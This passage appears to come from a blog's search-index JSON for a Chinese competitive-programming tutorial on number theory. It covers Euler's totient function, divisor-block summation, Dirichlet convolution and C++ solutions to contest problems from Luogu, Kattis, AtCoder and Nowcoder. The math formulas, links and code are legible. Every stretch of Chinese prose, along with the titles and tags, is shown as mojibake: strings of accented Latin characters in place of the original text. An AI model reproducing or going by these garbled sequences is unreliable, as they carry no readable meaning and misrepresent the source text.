\\rfloor$ï¼šå‘ä¸‹å–æ•´ç¬¦å·ï¼Œä¾‹å¦‚ $\\lfloor \\dfrac{5}{2} \\rfloor = 2$ $[]$ï¼šè‰¾å¼—æ£®æ‹¬å·ï¼Œä¾‹å¦‚ $[n = 1]$ åªæœ‰ $n = 1$ æ—¶æ‰å–å€¼ä¸º $1$ $x \\mid y$ï¼šæ•´é™¤ç¬¦å·ï¼Œè¡¨ç¤º $x$ æ•´é™¤ $y$ï¼Œä¹Ÿå°±æ˜¯ $x$ æ˜¯ $y$ çš„çº¦æ•°ï¼Œä¾‹å¦‚ $2 \\mid 4$ ","date":"2022-07-24","objectID":"/posts/cp%E6%95%B0%E8%AE%BA%E6%8F%90%E9%AB%98/:1:0","tags":["æ•°è®º"],"title":"æ•°è®ºæé«˜","uri":"/posts/cp%E6%95%B0%E8%AE%BA%E6%8F%90%E9%AB%98/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"æ¬§æ‹‰å‡½æ•° å®šä¹‰ï¼š$\\varphi(x)$ ä¸ºå°äºç­‰äº $x$ ä¸ $x$ äº’è´¨çš„æ•°ï¼Œå³ $$ \\varphi(x) = \\sum_ {i = 1} ^ {x} [\\gcd(x, i) = 1] $$ ","date":"2022-07-24","objectID":"/posts/cp%E6%95%B0%E8%AE%BA%E6%8F%90%E9%AB%98/:2:0","tags":["æ•°è®º"],"title":"æ•°è®ºæé«˜","uri":"/posts/cp%E6%95%B0%E8%AE%BA%E6%8F%90%E9%AB%98/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"æ€§è´¨ï¼š ç§¯æ€§å‡½æ•°ï¼š$\\varphi(x \\times y) = \\varphi(x) \\times \\varphi(y)$ å±•å¼€å¼ï¼šè®¾ $x = p_1 ^ {\\alpha_1}p_2 ^ {\\alpha_2}\\cdots p_k ^ {\\alpha_k}$ åˆ™ $\\varphi(x) = x \\times \\prod\\limits_{i = 1} ^ {k} \\dfrac{p_i - 1}{p_i}$ æ¬§æ‹‰åæ¼”ï¼š$n = \\sum\\limits_{d \\mid n} \\varphi(d)$ ","date":"2022-07-24","objectID":"/posts/cp%E6%95%B0%E8%AE%BA%E6%8F%90%E9%AB%98/:2:1","tags":["æ•°è®º"],"title":"æ•°è®ºæé«˜","uri":"/posts/cp%E6%95%B0%E8%AE%BA%E6%8F%90%E9%AB%98/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"$O(\\sqrt n)$ æ±‚æ¬§æ‹‰å‡½æ•°å€¼ï¼š int phi(int x) { int res = x; for (int i = 2; i * i \u003c= x; i ++) { if (x % i == 0) { res = res / i * (i - 1); while (x % i == 0) { x /= i; } } } if (x \u003e 1) { res = res / x * (x - 1); } return res; } ","date":"2022-07-24","objectID":"/posts/cp%E6%95%B0%E8%AE%BA%E6%8F%90%E9%AB%98/:2:2","tags":["æ•°è®º"],"title":"æ•°è®ºæé«˜","uri":"/posts/cp%E6%95%B0%E8%AE%BA%E6%8F%90%E9%AB%98/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"$O(n)$ ç­›æ¬§æ‹‰å‡½æ•° void get_eulers(int n) { euler[1] = 1; for (int i = 2; i \u003c= n; i ++) { if (!st[i]) { primes[cnt ++] = i; euler[i] = i - 1; } for (int j = 0; i * primes[j] \u003c= n; j ++) { int t = primes[j] * i; st[t] = true; if (i % primes[j] == 0) { euler[t] = euler[i] * primes[j]; break; } euler[t] = euler[i] * (primes[j] - 1); } } } ","date":"2022-07-24","objectID":"/posts/cp%E6%95%B0%E8%AE%BA%E6%8F%90%E9%AB%98/:2:3","tags":["æ•°è®º"],"title":"æ•°è®ºæé«˜","uri":"/posts/cp%E6%95%B0%E8%AE%BA%E6%8F%90%E9%AB%98/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"ä¹ é¢˜ ","date":"2022-07-24","objectID":"/posts/cp%E6%95%B0%E8%AE%BA%E6%8F%90%E9%AB%98/:3:0","tags":["æ•°è®º"],"title":"æ•°è®ºæé«˜","uri":"/posts/cp%E6%95%B0%E8%AE%BA%E6%8F%90%E9%AB%98/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"[2021 ICPC North American Qualifier Contest] Common Factors é¢˜ç›®é“¾æ¥ï¼šhttps://open.kattis.com/problems/commonfactors é¢˜æ„ ç»™å®šä¸€ä¸ªæ­£æ•´æ•° $n$ï¼Œæ±‚ $$ \\max\\limits_{i = 2} ^ {n} \\dfrac{i - \\varphi(i)}{i} $$ å¹¶è¾“å‡ºå…¶æœ€ç®€åˆ†æ•°å½¢å¼ã€‚$(1 \\le n \\le 10 ^ {18})$ åˆ†æï¼š å°†å¼å­åŒ–ç®€å¾— $\\max\\limits_{i = 2} ^ {n} \\dfrac{i - \\varphi(i)}{i} = 1 -\\min_{i = 2} ^ {n} \\dfrac{\\varphi(i)}{i}$ å…¶ä¸­ $\\dfrac{\\varphi(x)}{x} = \\prod\\limits_{i = 1} ^ {k}\\dfrac{p_i - 1}{p_i}$ï¼Œæ•…è½¬æ¢ä¸ºäº†æ±‚åˆ†æ•°æœ€å°å€¼ã€‚ ç”±äº $\\dfrac{p_i - 1}{p_i} \u003c 1$ï¼Œæ‰€ä»¥è¦å°½å¯èƒ½å¤šçš„å«æœ‰è´¨å› å­ï¼Œé‚£ä¹ˆæœ€å¥½æƒ…å†µå°±æ˜¯ $2 \\times3\\times\\cdots$ æ³¨æ„åˆ° $2 \\times 3 \\times 5 \\times 7 \\times 11 \\times 13 \\times 17 \\times 19 \\times 23 \\times 29 \\times 31 \\times 37 \\times 41 \\times 43 \\times 47 \\times 53 \u003e 10 ^ {18}$ æ‰€ä»¥åªéœ€è¦æ‰¾åˆ° $53$ ä»¥å†…çš„ç´ æ•°ï¼Œä¸æ–­ä¹˜èµ·æ¥å³å¯ï¼Œæ³¨æ„åˆ¤æ–­æ—¶å¯èƒ½çˆ† long longï¼Œè¦è½¬ __int128 ä»£ç ï¼š #include \u003cbits/stdc++.h\u003e #define int long long using namespace std; signed main() { cin.tie(0) -\u003e sync_with_stdio(0); int n; cin \u003e\u003e n; auto prime = [\u0026](int x) { for (int i = 2; i * i \u003c= x; i ++) { if (x % i == 0) { return false; } } return true; }; auto phi = [\u0026](int x) { int res = x; for (int i = 2; i * i \u003c= x; i ++) { if (x % i == 0) { res = res / i * (i - 1); while (x % i == 0) { x /= i; } } } if (x \u003e 1) { res = res / x * (x - 1); } return res; }; int sum = 1; for (int i = 2; i \u003c= 53; i ++) { if (prime(i)) { if ((__int128)i * sum \u003e n) { int up = sum - phi(sum), down = sum; int Gcd = __gcd(up, down); up /= Gcd, down /= Gcd; cout \u003c\u003c up \u003c\u003c \"/\" \u003c\u003c down \u003c\u003c \"\\n\"; return 0; } sum *= i; } } } æ€è€ƒï¼š æ±‚ $\\dfrac{\\varphi(n)}{n}$ çš„æœ€å¤§å€¼ã€‚ å³åªéœ€è¦æ‰¾åˆ°ä¸€ä¸ªå°äºç­‰äº $n$ çš„æœ€å¤§è´¨æ•°ã€‚ ","date":"2022-07-24","objectID":"/posts/cp%E6%95%B0%E8%AE%BA%E6%8F%90%E9%AB%98/:3:1","tags":["æ•°è®º"],"title":"æ•°è®ºæé«˜","uri":"/posts/cp%E6%95%B0%E8%AE%BA%E6%8F%90%E9%AB%98/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"[æ´›è°· P1891] ç–¯ç‹‚ LCM é¢˜ç›®é“¾æ¥ï¼šhttps://www.luogu.com.cn/problem/P1891 é¢˜æ„ï¼š $T$ ç»„è¾“å…¥ï¼Œæ¯æ¬¡ç»™å®šä¸€ä¸ªæ­£æ•´æ•° $n$ï¼Œæ±‚ $$ \\sum_{i=1} ^{n} \\text{lcm}(i,n) $$ $1 \\le T \\le 3 \\times 10 ^ 5, 1 \\le n \\le 10 ^ 6$ åˆ†æï¼š ç”± $\\text{lcm}(i,n) = \\dfrac{i \\times n}{\\gcd{(i,n)}}$ å¾— $$ \\sum_{i=1} ^{n} \\frac{i \\times n}{\\gcd{(i,n)}} $$ æšä¸¾ $\\gcd(i,n)$ $$ n \\sum_{d \\mid n} \\sum_{i=1} ^{n} \\frac{i }{d}[\\gcd{(i,n)} = d] $$ åˆ©ç”¨ $\\gcd$ çš„æ€§è´¨ï¼š $$ n \\sum_{d \\mid n} \\sum_{i=1} ^{n} \\frac{i }{d}[\\gcd{(\\frac{i}{d},\\frac{n}{d})} = 1] $$ æŠŠ $d$ æ‹¿åˆ°ä¸Šç•Œï¼Œä¹Ÿå°±æ˜¯åšå˜æ¢ $\\dfrac{i}{d} \\rightarrow i$ $$ n \\sum_{d \\mid n} \\sum_{i=1} ^{ \\lfloor \\frac{n}{d} \\rfloor } i[\\gcd{(i,\\frac{n}{d})} = 1 ] $$ ç”±äºçº¦æ•°æˆå¯¹å‡ºç°ï¼Œæ‰€ä»¥ç¬¬äºŒå±‚å’Œå¼çš„ $\\lfloor \\dfrac{n}{d} \\rfloor$ ç­‰ä»·äº $d$ $$ n \\sum_{d \\mid n} \\sum_{i=1} ^{ d } i[\\gcd{(i,d)} = 1] $$ ç”±äº $\\gcd(i, d) = \\gcd(d - i,d)$ ï¼Œæ‰€ä»¥å¿…æˆå¯¹å‡ºç°ï¼Œé‚£ä¹ˆæ€»å…±å‡ºç°äº† $\\dfrac{\\varphi(d)}{2}$ æ¬¡ï¼Œ$d - i + i =d$ï¼Œæ‰€ä»¥å°±æ˜¯ $$ n \\sum_{d \\mid n} \\frac{\\varphi(d)}{2} d $$ è¿™æ ·æ—¶é—´å¤æ‚åº¦æ˜¯ $O(N+T\\sqrt{n})$ï¼Œä½†æ˜¯å¯ä»¥ç”¨ç‹„åˆ©å…‹é›·å·ç§¯ä¼˜åŒ–ï¼Œå¯ä»¥åšåˆ° $O(N \\log{N} + T)$ è®¾ $F(x) = \\dfrac{x \\times \\varphi(x)}{2}$ åˆ™ç­”æ¡ˆä¸º $n \\times F * \\textbf{1}$ï¼Œæ³¨æ„å¤„ç† $d \\le 2$ çš„æƒ…å†µã€‚ ä»£ç ï¼š #include \u003cbits/stdc++.h\u003e #define int long long using namespace std; int cnt; vector\u003cint\u003e primes, euler, f; vector\u003cbool\u003e st; void init(int n) { f.resize(n + 1), primes.resize(n + 1), euler.resize(n + 1), st.resize(n + 1); euler[1] = 1; for (int i = 2; i \u003c= n; i ++) { if (!st[i]) { primes[cnt ++] = i; euler[i] = i - 1; } for (int j = 0; i * primes[j] \u003c= n; j ++) { int t = i * primes[j]; st[t] = 1; if (i % primes[j] == 0) { euler[t] = euler[i] * primes[j]; break; } euler[t] = euler[i] * (primes[j] - 1); } } for (int i = 1; i \u003c= n; i ++) { for (int j = i; j \u003c= n; j += i) { if (i \u003c= 2) { f[j] ++; } else { f[j] += euler[i] / 2 * i; } } } } void solve() { int n; cin \u003e\u003e n; cout \u003c\u003c n * f[n] \u003c\u003c \"\\n\"; } signed main() { init(1e6); cin.tie(0) -\u003e sync_with_stdio(0); int T; cin \u003e\u003e T; while (T --) { solve(); } } ","date":"2022-07-24","objectID":"/posts/cp%E6%95%B0%E8%AE%BA%E6%8F%90%E9%AB%98/:3:2","tags":["æ•°è®º"],"title":"æ•°è®ºæé«˜","uri":"/posts/cp%E6%95%B0%E8%AE%BA%E6%8F%90%E9%AB%98/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"æ•°è®ºåˆ†å— ","date":"2022-07-24","objectID":"/posts/cp%E6%95%B0%E8%AE%BA%E6%8F%90%E9%AB%98/:4:0","tags":["æ•°è®º"],"title":"æ•°è®ºæé«˜","uri":"/posts/cp%E6%95%B0%E8%AE%BA%E6%8F%90%E9%AB%98/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"å¼•å…¥ï¼š$\\sum\\limits_{i = 1} ^ {n} \\lfloor \\dfrac{n}{i} \\rfloor$ å‡è®¾å– $n = 100$ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ‰“è¡¨å‘ç°æ¯ä¸€é¡¹çš„åˆ†å¸ƒæƒ…å†µï¼Œå‘ç°ç»“æœçš„å–å€¼éƒ½æ˜¯è¿ç»­ä¸€æ®µçš„ï¼Œå¹¶ä¸”æœ‰ $\\sqrt n$ å— å¯¹äºæ¯ä¸€å— $i$ çš„å³ç«¯ç‚¹ä¸º $\\left \\lfloor \\dfrac{n}{\\lfloor \\dfrac{n}{i} \\rfloor} \\right \\rfloor$ï¼Œæ¯ä¸€å—çš„å€¼éƒ½ä¸º $\\lfloor \\dfrac{n}{i} \\rfloor$ ä»£ç : for (int l = 1, r; l \u003c= n; l = r + 1) { r = n / (n / l); res += (r - l + 1) * (n / l); } è¿™æ ·å°±åšåˆ°äº† $O(\\sqrt n)$ æ±‚å’Œ ","date":"2022-07-24","objectID":"/posts/cp%E6%95%B0%E8%AE%BA%E6%8F%90%E9%AB%98/:4:1","tags":["æ•°è®º"],"title":"æ•°è®ºæé«˜","uri":"/posts/cp%E6%95%B0%E8%AE%BA%E6%8F%90%E9%AB%98/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"ä¹ é¢˜ â€¢https://www.luogu.com.cn/problem/P2424 ","date":"2022-07-24","objectID":"/posts/cp%E6%95%B0%E8%AE%BA%E6%8F%90%E9%AB%98/:5:0","tags":["æ•°è®º"],"title":"æ•°è®ºæé«˜","uri":"/posts/cp%E6%95%B0%E8%AE%BA%E6%8F%90%E9%AB%98/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"[æ´›è°· P2261] ä½™æ•°æ±‚å’Œ é¢˜ç›®é“¾æ¥ï¼šhttps://www.luogu.com.cn/problem/P2261 é¢˜æ„ ç»™å®šæ­£æ•´æ•° $n, k$ï¼Œæ±‚ $$ \\sum_{i = 1} ^ {n} k \\bmod i $$ $(1 \\le n, k \\le 10 ^ 9)$ åˆ†æï¼š æ ¹æ®ä½™æ•°çš„å®šä¹‰ï¼š$k \\bmod i = k - i \\times \\lfloor \\dfrac{k}{i} \\rfloor$ å¼å­ç­‰ä»·äº $$ \\sum_{i = 1} ^ {n}(k - i \\times \\lfloor \\dfrac{k}{i} \\rfloor) =n \\times k - \\sum_{i = 1} ^ {n} i \\times \\lfloor \\dfrac{k}{i} \\rfloor $$ æ³¨æ„åˆ° $\\lfloor \\dfrac{k}{i} \\rfloor$ï¼Œå¯ä»¥åˆ©ç”¨æ•´é™¤åˆ†å— ä»£ç ï¼š #include \u003cbits/stdc++.h\u003e #define int long long using namespace std; signed main() { cin.tie(0) -\u003e sync_with_stdio(0); int n, k; cin \u003e\u003e n \u003e\u003e k; int res = 0; for (int l = 1, r; l \u003c= n; l = r + 1) { if (k / l != 0) { r = min(k / (k / l), n); } else { r = n; } res += (r - l + 1) * (l + r) / 2 * (k / l); } cout \u003c\u003c n * k - res \u003c\u003c \"\\n\"; } ","date":"2022-07-24","objectID":"/posts/cp%E6%95%B0%E8%AE%BA%E6%8F%90%E9%AB%98/:5:1","tags":["æ•°è®º"],"title":"æ•°è®ºæé«˜","uri":"/posts/cp%E6%95%B0%E8%AE%BA%E6%8F%90%E9%AB%98/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"[æ´›è°· P2424] çº¦æ•°å’Œ é¢˜ç›®é“¾æ¥ï¼šhttps://www.luogu.com.cn/problem/P2424 é¢˜æ„ å®šä¹‰ $f(x)$ ä¸º $x$ çš„æ‰€æœ‰çº¦æ•°å’Œï¼Œ ç»™å®šä¸¤ä¸ªæ­£æ•´æ•° $l, r$ï¼Œæ±‚ $\\sum\\limits_{i = l} ^ {r} f(i)$ $(1 \\le l \u003c r \\le 2 \\times 10 ^ 9)$ åˆ†æï¼š ä¸€ä¸ªæ•° $x$ çš„æ‰€æœ‰çº¦æ•°å’Œå¯ä»¥è¡¨ç¤ºä¸º $f(x) = \\sum\\limits_{d \\mid x}d$ é‚£ä¹ˆ $$ \\sum\\limits_{i = 1} ^ {n} f(i) = \\sum\\limits_{i = 1} ^ {n}\\sum\\limits_{d \\mid i}d $$ äº¤æ¢ä¸€ä¸‹æšä¸¾é¡ºåº $$ \\sum\\limits_{i = 1} ^ {n}\\sum\\limits_{d \\mid i}d = \\sum_{d = 1} ^ {n} d \\times \\lfloor \\frac{n}{d} \\rfloor $$ å¯ä»¥åˆ©ç”¨æ•´é™¤åˆ†å—æ±‚è§£ ä»£ç ï¼š #include \u003cbits/stdc++.h\u003e #define int long long using namespace std; signed main() { int l, r; cin \u003e\u003e l \u003e\u003e r; auto f = [\u0026](int n) { if (!n) return 0ll; int res = 0; for (int l = 1, r; l \u003c= n; l = r + 1) { r = n / (n / l); res += (l + r) * (r - l + 1) * (n / l) / 2; } return res; }; cout \u003c\u003c f(r) - f(l - 1) \u003c\u003c endl; } ","date":"2022-07-24","objectID":"/posts/cp%E6%95%B0%E8%AE%BA%E6%8F%90%E9%AB%98/:5:2","tags":["æ•°è®º"],"title":"æ•°è®ºæé«˜","uri":"/posts/cp%E6%95%B0%E8%AE%BA%E6%8F%90%E9%AB%98/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"ç‹„åˆ©å…‹é›·å·ç§¯ ","date":"2022-07-24","objectID":"/posts/cp%E6%95%B0%E8%AE%BA%E6%8F%90%E9%AB%98/:6:0","tags":["æ•°è®º"],"title":"æ•°è®ºæé«˜","uri":"/posts/cp%E6%95%B0%E8%AE%BA%E6%8F%90%E9%AB%98/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"å®šä¹‰ï¼š å¯¹äºä¸¤ä¸ªæ•°è®ºå‡½æ•° $f(x),g(x)$ é‚£ä¹ˆå®ƒä»¬çš„å·ç§¯ $h(x)$ è®°ä½œ $f(x) * g(x)$ï¼Œå¼å­å¦‚ä¸‹ï¼š $$ f(x) * g(x) = h(x) = \\sum_{d \\mid n} f(d)g(\\frac{n}{d}) $$ ç®€è®°ä¸º $h = f * g$ ","date":"2022-07-24","objectID":"/posts/cp%E6%95%B0%E8%AE%BA%E6%8F%90%E9%AB%98/:6:1","tags":["æ•°è®º"],"title":"æ•°è®ºæé«˜","uri":"/posts/cp%E6%95%B0%E8%AE%BA%E6%8F%90%E9%AB%98/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"æ€§è´¨ï¼š äº¤æ¢å¾‹ï¼š $f * g = g * f$ ç»“åˆå¾‹ï¼š $(f * g) * h = f * (g * h)$ åˆ†é…å¾‹ï¼š $(f + g) * h = f * h + g * h$ ä¸¤ä¸ªç§¯æ€§å‡½æ•°çš„ç‹„åˆ©å…‹é›·å·ç§¯è¿˜æ˜¯ç§¯æ€§å‡½æ•° ","date":"2022-07-24","objectID":"/posts/cp%E6%95%B0%E8%AE%BA%E6%8F%90%E9%AB%98/:6:2","tags":["æ•°è®º"],"title":"æ•°è®ºæé«˜","uri":"/posts/cp%E6%95%B0%E8%AE%BA%E6%8F%90%E9%AB%98/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"å¸¸è§ç§¯æ€§å‡½æ•°ï¼š 1. è«æ¯”ä¹Œæ–¯å‡½æ•°ï¼š$\\mu(x)$ è®¾ $n=p_1^{c_1}\\cdots p_k^{c_k}$ $$\\mu(n)=\\begin{cases} 0,\u0026\\exists i \\in[1,k],c_i \u003e1 \\\\ 1,\u0026k \\equiv 0\\pmod2,\\forall i \\in[1,k],c_i=1\\\\ -1,\u0026k\\equiv1\\pmod2,\\forall i\\in [1,k],c_i=1 \\end{cases}$$ 2. æ¬§æ‹‰å‡½æ•°ï¼š$\\varphi(x)$ $\\varphi(n) = \\sum \\limits_{i=1} ^{n}[\\gcd(i,n) = 1]$ 3. å•ä½å‡½æ•°ï¼š$\\varepsilon(x)$ $\\varepsilon(n) = [n = 1]$ 4. æ’ç­‰å‡½æ•°ï¼š$Id(x)$ $Id(n) = n$ 5. å¸¸æ•°å‡½æ•°ï¼š$I(x)$ $I(n)=1$ 6. çº¦æ•°ä¸ªæ•°å‡½æ•°ï¼š$d(x)$ $d(n)=\\sum \\limits_{i \\mid n}1$ 7. çº¦æ•°å’Œå‡½æ•°ï¼š$\\sigma(x)$ $\\sigma(n)=\\sum \\limits_{d \\mid n} d$ ","date":"2022-07-24","objectID":"/posts/cp%E6%95%B0%E8%AE%BA%E6%8F%90%E9%AB%98/:6:3","tags":["æ•°è®º"],"title":"æ•°è®ºæé«˜","uri":"/posts/cp%E6%95%B0%E8%AE%BA%E6%8F%90%E9%AB%98/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"å¸¸è§å·ç§¯ï¼š 1. $\\varepsilon = \\mu * 1$ $\\varepsilon = [n=1]=\\sum \\limits _{d \\mid n} \\mu (d)$ 2. $d = 1 * 1$ $d(n)=\\sum \\limits_{i \\mid n}1$ 3. $Id * 1 = \\sigma$ $\\sigma(n)=\\sum \\limits_{d \\mid n} d$ 4. $\\mu * Id = \\varphi$ $\\varphi(n)=\\sum \\limits _{d \\mid n} d \\times \\mu(\\dfrac{n}{d})$ 5. $\\varphi * 1 = Id$ $Id(n)=\\sum \\limits _{d \\mid n} \\varphi(d)$ ç‹„åˆ©å…‹é›·å·ç§¯å¯åšåˆ° $O(n \\log n)$ï¼Œåˆ©ç”¨æšä¸¾å€æ•°æ³•ã€‚ $$ \\frac{n}{1} + \\frac{n}{2} + \\cdots + \\frac{n}{n} = n \\times (\\frac{1}{1} + \\frac{1}{2} + \\cdots + \\frac{1}{n}) $$ å…¶ä¸­ $\\dfrac{1}{1} + \\dfrac{1}{2} + \\cdots + \\dfrac{1}{n}$ ä¸ºè°ƒå’Œçº§æ•°ï¼Œçº¦ä¸º $\\ln n$ æšä¸¾å€æ•°æ³•ä»£ç ï¼š for (int i = 1; i \u003c= n; i ++) { for (int j = i; j \u003c= n; j += i) { } } ","date":"2022-07-24","objectID":"/posts/cp%E6%95%B0%E8%AE%BA%E6%8F%90%E9%AB%98/:6:4","tags":["æ•°è®º"],"title":"æ•°è®ºæé«˜","uri":"/posts/cp%E6%95%B0%E8%AE%BA%E6%8F%90%E9%AB%98/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"ä¹ é¢˜ ","date":"2022-07-24","objectID":"/posts/cp%E6%95%B0%E8%AE%BA%E6%8F%90%E9%AB%98/:7:0","tags":["æ•°è®º"],"title":"æ•°è®ºæé«˜","uri":"/posts/cp%E6%95%B0%E8%AE%BA%E6%8F%90%E9%AB%98/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"[ç‰›å®¢å°ç™½æœˆèµ› 40] æ¥ç‚¹gcd é¢˜ç›®é“¾æ¥ï¼šhttps://ac.nowcoder.com/acm/problem/229589 é¢˜æ„ $T$ ç»„è¾“å…¥ï¼Œç»™å®šä¸€ä¸ªæœ‰ $n$ ä¸ªå…ƒç´ çš„å¤šé‡é›† $S$ï¼Œæœ‰ $m$ ä¸ªè¯¢é—®ï¼Œå¯¹äºæ¯ä¸ªè¯¢é—®ï¼Œç»™å‡ºä¸€ä¸ªæ•´æ•° $x$ï¼Œé—®æ˜¯å¦èƒ½é€‰æ‹© $S$ çš„ä¸€ä¸ªéç©ºå­é›†ï¼Œæ»¡è¶³è¿™ä¸ªå­é›†çš„ $\\gcd$ ç­‰äº $x$ï¼Œå½“é›†åˆåªæœ‰ä¸€ä¸ªæ•°æ—¶ï¼Œè¿™ä¸ªé›†åˆçš„ $\\gcd$ å°±ç­‰äºè¿™ä¸ªæ•° $\\sum n, m \\le 10 ^ 6$ åˆ†æï¼š $S$ ä¸­èƒ½å– $\\gcd$ æˆä¸º $x$ çš„åªå¯èƒ½æ˜¯ $x$ çš„å€æ•°ï¼Œæ•…ç›´æ¥å·ç§¯ $O(n \\log n)$ å³å¯ã€‚ ä»£ç ï¼š #include \u003cbits/stdc++.h\u003e #define int long long using namespace std; void solve() { int n, m; cin \u003e\u003e n \u003e\u003e m; vector\u003cint\u003e Gcd(n + 1), mp(n + 1); for (int i = 1; i \u003c= n; i ++) { int x; cin \u003e\u003e x; mp[x] = 1; } for (int i = 1; i \u003c= n; i ++) { for (int j = i; j \u003c= n; j += i) { if (mp[j]) { Gcd[i] = __gcd(Gcd[i], j); } } } while (m --) { int x; cin \u003e\u003e x; cout \u003c\u003c (Gcd[x] == x ? \"YES\" : \"NO\") \u003c\u003c \"\\n\"; } } signed main() { cin.tie(0) -\u003e sync_with_stdio(0); int T; cin \u003e\u003e T; while (T --) { solve(); } } ","date":"2022-07-24","objectID":"/posts/cp%E6%95%B0%E8%AE%BA%E6%8F%90%E9%AB%98/:7:1","tags":["æ•°è®º"],"title":"æ•°è®ºæé«˜","uri":"/posts/cp%E6%95%B0%E8%AE%BA%E6%8F%90%E9%AB%98/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"[AtCoder Beginner Contest 206] Divide Both é¢˜ç›®é“¾æ¥ï¼šhttps://atcoder.jp/contests/abc206/tasks/abc206_e é¢˜æ„ ç»™å®šä¸¤ä¸ªæ­£æ•´æ•° $l, r$ï¼Œæ‰¾åˆ°åŒºé—´ $[l, r]$ æ»¡è¶³ä¸‹åˆ—æ¡ä»¶çš„äºŒå…ƒç»„ $(x, y)$ $l \\le x,y \\le r$ $\\gcd(x, y) \\ne 1$ ä¸” $\\dfrac{x}{\\gcd(x, y)} \\ne 1$ ä¸” $\\dfrac{y}{\\gcd(x, y)} \\ne 1$ åˆ†æï¼š è½¬æ¢ä¸€ä¸‹é¢˜æ„ï¼Œå³æ‰¾åˆ°åŒºé—´ä¸äº’è´¨ä¹Ÿä¸äº’ä¸ºå€æ•°çš„äºŒå…ƒç»„ã€‚ è€ƒè™‘æšä¸¾ä¸¤ä¸ªæ•°çš„å…¬çº¦æ•° $x$ï¼Œè®¾ $x$ åŠ $x$ çš„å€æ•°åœ¨åŒºé—´ $[l, r]$ çš„ä¸ªæ•°ä¸º $\\text{cnt}_x$ï¼Œé‚£ä¹ˆä¸¤ä¸¤ç»„åˆçš„æ–¹æ¡ˆæ•°ä¸º $\\text{cnt}x ^ 2$ï¼Œè¿™æ ·ä¼šæœ‰é‡å¤ï¼Œæ‰€ä»¥å‡å» $x$ çš„å€æ•°æ‰€æœ‰æ–¹æ¡ˆï¼Œå³ $\\text{cnt}^ 2_x - \\sum\\limits{x \\mid d ,d\\ne x} \\text{cnt}^2_d$ã€‚æ­¤å¤–ï¼Œè¿˜éœ€è¦å‡å»ä¸ $x$ äº’ä¸ºå€æ•°çš„æ•°é‡ï¼Œå³ $2 \\times \\text{cnt}_x - 1$ï¼Œ$-1$ æ˜¯å› ä¸º $(x, x)$ é‡å¤å‡æ‰äº†ä¸€æ¬¡ã€‚ ä»£ç ï¼š #include \u003cbits/stdc++.h\u003e #define int long long using namespace std; signed main() { cin.tie(0) -\u003e sync_with_stdio(0); int l, r; cin \u003e\u003e l \u003e\u003e r; vector\u003cint\u003e cnt(r + 1); for (int i = 2; i \u003c= r; i ++) { for (int j = i; j \u003c= r; j += i) { if (j \u003e= l) { cnt[i] ++; } } } int res = 0; vector\u003cint\u003e cnt2(r + 1); for (int i = r; i \u003e= 2; i --) { cnt2[i] = cnt[i] * cnt[i]; for (int j = i \u003c\u003c 1; j \u003c= r; j += i) { cnt2[i] -= cnt2[j]; } res += cnt2[i]; if (i \u003e= l) { res -= 2 * cnt[i] - 1; } } cout \u003c\u003c res \u003c\u003c \"\\n\"; } ","date":"2022-07-24","objectID":"/posts/cp%E6%95%B0%E8%AE%BA%E6%8F%90%E9%AB%98/:7:2","tags":["æ•°è®º"],"title":"æ•°è®ºæé«˜","uri":"/posts/cp%E6%95%B0%E8%AE%BA%E6%8F%90%E9%AB%98/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"åŸé¢˜é“¾æ¥ é¢˜æ„ $T$ ç»„è¾“å…¥ï¼Œæ¯æ¬¡ç»™å®šä¸€ä¸ªæ­£æ•´æ•° $n$ï¼Œå®šä¹‰ $f(k)$ ä¸º $k$ çš„è´¨å› å­ä¸ªæ•°ï¼Œ$g(k) = 2 ^ {f(i)}$ï¼Œæ±‚ $$ \\sum_{i = 1} ^ {n} g(i) $$ $1 \\le T \\le 50, 1 \\le n \\le 10 ^ {12}$ åˆ†æï¼š é¦–å…ˆ $2 ^ {f(i)}$ ä¸å¥½ç›´æ¥è®¡ç®—ï¼Œè€ƒè™‘ç»„åˆæ„ä¹‰ï¼Œå‘ç° $2 ^ {f(i)}$ å°±æ˜¯ä» $i$ çš„æ‰€æœ‰è´¨å› å­ä¸­é€‰å‡ºè‹¥å¹²ä¸ªå­é›†çš„æ–¹æ¡ˆæ•°ï¼Œå‡è®¾ $i = p_1 ^ {\\alpha_1} p_2 ^ {\\alpha_2}\\cdots p_k ^ {\\alpha_k}$ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥æšä¸¾ $i$ çš„æ‰€æœ‰çº¦æ•° $d$ï¼Œå°†çº¦æ•°å¸¦å…¥è«æ¯”ä¹Œæ–¯å‡½æ•°ï¼Œé‚£ä¹ˆå°±å»æ‰äº†æ‰€æœ‰å­˜åœ¨å¤§äºç­‰äº $2$ æ¬¡çš„è´¨å› å­ï¼Œæ‰€ä»¥æ¯ä¸ª $\\alpha_i$ åªèƒ½å– $0$ æˆ– $1$ï¼Œä½†å¦‚æœæœ‰å¥‡æ•°ä¸ªè´¨å› å­è«æ¯”ä¹Œæ–¯å‡½æ•°å€¼ä¸ºè´Ÿæ•°ï¼Œæ‰€ä»¥å¹³æ–¹ä¸€ä¸‹å³å¯ï¼Œå³ $$\\sum_{i = 1} ^ {n}2 ^ {f(i)} = \\sum_{i = 1} ^ {n} \\sum_{d \\mid i} \\mu ^ 2(d)$$ äº¤æ¢æ±‚å’Œæ¬¡åº $$ \\sum_{d = 1} ^ {n} \\mu ^ 2(d) \\lfloor\\frac{n}{d}\\rfloor $$ 